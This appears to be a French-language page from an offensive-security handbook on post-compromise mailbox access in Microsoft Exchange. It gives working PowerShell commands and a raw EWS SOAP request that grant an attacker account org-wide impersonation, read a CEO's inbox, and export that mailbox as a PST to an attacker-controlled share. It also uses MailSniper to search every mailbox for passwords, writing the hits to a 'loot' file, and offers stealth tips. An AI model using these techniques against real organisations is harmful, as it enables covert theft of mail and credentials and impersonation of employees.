---
order: 5
title: "Accès aux boîtes aux lettres : lire et incarner chaque boîte aux lettres"
description: "Accès aux boîtes aux lettres post-identifiant et post-RCE sur Exchange : EWS ApplicationImpersonation pour lire n'importe quelle boîte aux lettres, les appels SOAP EWS FindItem/GetItem bruts, Exchange Management Shell Get-Mailbox et New-MailboxExportRequest pour dumper une boîte aux lettres en PST, et la recherche de courrier MailSniper sur sa propre boîte et à l'échelle globale pour des identifiants et du renseignement."
keywords:
  - mailbox access
  - ApplicationImpersonation
  - EWS FindItem
  - New-MailboxExportRequest
  - MailSniper
---

# Accès aux boîtes aux lettres

Les boîtes aux lettres contiennent des mots de passe, des liens de réinitialisation, des secrets VPN et d'applications, des schémas réseau, et la confiance permanente d'envoyer du courrier **en tant que** véritable employé. Avec un identifiant vous lisez votre propre courrier ; avec le rôle `ApplicationImpersonation` ou l'Exchange Management Shell vous lisez **celui de tout le monde**. La méthode d'accès dépend de ce que vous détenez : un identifiant de boîte aux lettres passe par EWS, un contexte Exchange-admin ou `SYSTEM` sur la machine passe par le management shell.

## Vous accorder la lecture : ApplicationImpersonation

Le rôle RBAC **`ApplicationImpersonation`** permet à un compte d'agir en tant que n'importe quelle boîte aux lettres via EWS. Depuis un contexte Exchange admin (ou `SYSTEM` après une [chaîne RCE](rce-chains/index.md), via l'Exchange Management Shell local), attribuez-le à un compte contrôlé :

```powershell
# Exchange Management Shell: give a controlled account org-wide impersonation
New-ManagementRoleAssignment -Name "ar-impersonate" -Role ApplicationImpersonation -User attacker
Get-ManagementRoleAssignment -Role ApplicationImpersonation   # confirm the grant took
```

Ce compte peut désormais s'authentifier à EWS et régler l'identité impersonnée sur n'importe quelle boîte aux lettres, sans permission par boîte aux lettres et sans mot de passe pour la victime.

## Lire une boîte aux lettres via EWS brut

EWS est une API SOAP à `/ews/exchange.asmx`. `FindItem` liste les éléments d'un dossier, `GetItem` récupère le corps d'un message. L'en-tête SOAP `ExchangeImpersonation` est ce qui consomme le rôle ci-dessus, nommant la boîte aux lettres à incarner :

```http
POST /ews/exchange.asmx HTTP/1.1
Host: mail.example.com
Authorization: Basic <base64 attacker creds>
Content-Type: text/xml; charset=utf-8

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header>
    <t:ExchangeImpersonation><t:ConnectingSID>
      <t:PrimarySmtpAddress>ceo@example.com</t:PrimarySmtpAddress>
    </t:ConnectingSID></t:ExchangeImpersonation>
  </soap:Header>
  <soap:Body>
    <m:FindItem Traversal="Shallow">
      <m:ItemShape><t:BaseShape>IdOnly</t:BaseShape></m:ItemShape>
      <m:ParentFolderIds><t:DistinguishedFolderId Id="inbox"/></m:ParentFolderIds>
    </m:FindItem>
  </soap:Body>
</soap:Envelope>
```

Un `200` avec un `FindItemResponseMessage` listant des valeurs `ItemId` confirme que l'impersonation a fonctionné et que vous lisez la boîte de réception du CEO ; portez chaque `ItemId` dans une requête `GetItem` pour en tirer le corps. Un `401` signifie que l'identifiant de l'attaquant est faux ; une erreur SOAP `ErrorImpersonateUserDenied` signifie que le compte n'a pas le rôle, donc revoyez l'attribution ci-dessus.

## Dumper une boîte aux lettres entière en PST

Depuis un contexte Exchange-admin ou `SYSTEM`, le management shell exporte une boîte aux lettres entière vers un PST sur un partage que vous contrôlez, que vous ouvrez ensuite hors ligne :

```powershell
# Export a target mailbox to a PST on an attacker-reachable UNC path
New-MailboxExportRequest -Mailbox ceo@example.com -FilePath \\10.10.14.7\share\ceo.pst
Get-MailboxExportRequest | Get-MailboxExportRequestStatistics   # watch it reach "Completed"
# enumerate who is worth exporting
Get-Mailbox -ResultSize unlimited | Select Name,PrimarySmtpAddress,Database
```

`New-MailboxExportRequest` nécessite le rôle `Mailbox Import Export`, qu'un admin Exchange peut s'auto-attribuer de la même façon que ci-dessus. Quand le statut affiche `Completed`, le PST sur votre partage est la boîte aux lettres complète, hors ligne et consultable.

## Rechercher le courrier à grande échelle

MailSniper enveloppe EWS pour grep le courrier à la recherche de secrets, soit votre propre boîte, soit, avec l'impersonation, l'organisation entière :

```powershell
# Your own mailbox (terms are -like, so wrap in wildcards)
Invoke-SelfSearch -Mailbox john.doe@example.com -Terms "*password*","*vpn*","*secret*","*apikey*"
# Every mailbox, using the ApplicationImpersonation account granted above
Invoke-GlobalMailSearch -ImpersonationAccount attacker -ExchHostname mail.example.com `
  -Terms "*password*","*credential*" -OutputCsv loot.csv
```

`loot.csv` est la liste des résultats : expéditeur, boîte aux lettres, objet, et extrait correspondant. En pratique, les victoires les plus rapides sont les courriels de réinitialisation du helpdesk, les mots de passe de comptes de service, et les secrets d'applications envoyés en clair.

## Notes d'exploitation

- La recherche de courrier est régulièrement le **chemin le plus rapide vers plus d'identifiants** : réinitialisations, mots de passe de comptes de service et secrets d'applications vivent en clair dans les boîtes de réception.
- `ApplicationImpersonation` via EWS est plus discret que `New-MailboxExportRequest`, qui écrit un objet de requête d'export et touche un partage ; préférez la lecture EWS pour le vol ciblé, l'export PST seulement quand vous voulez la boîte entière hors ligne.
- L'impersonation ne nécessite pas `SYSTEM` sur le serveur, seulement le rôle, donc un admin Exchange compromis suffit ; à l'inverse, après une chaîne RCE le management shell local s'exécute de façon pratiquement sans restriction.
- Détenir une boîte aux lettres permet aussi d'envoyer **en tant qu'**utilisateur interne de confiance et de planter de l'[abus Outlook](outlook-client-abuse.md) côté client et de la [persistance dans le flux de courrier](mail-flow-persistence.md) côté serveur.

## Outils

- **MailSniper** (`Invoke-SelfSearch`, `Invoke-GlobalMailSearch`, `Get-GlobalAddressList`) : recherche de courrier EWS et impersonation.
- **Exchange Management Shell** (`New-ManagementRoleAssignment`, `New-MailboxExportRequest`, `Get-Mailbox`) : attributions de rôles et export PST.
- **impacket / exchangelib / ruler** : opérations EWS et MAPI scriptées sur les boîtes aux lettres.

## Références

- [MailSniper (dafthack)](https://github.com/dafthack/MailSniper)
- [Microsoft: Impersonation and EWS in Exchange](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/impersonation-and-ews-in-exchange)
- [Microsoft: New-MailboxExportRequest](https://learn.microsoft.com/en-us/powershell/module/exchange/new-mailboxexportrequest)
- [Black Hills InfoSec: attacking Exchange with MailSniper](https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/)
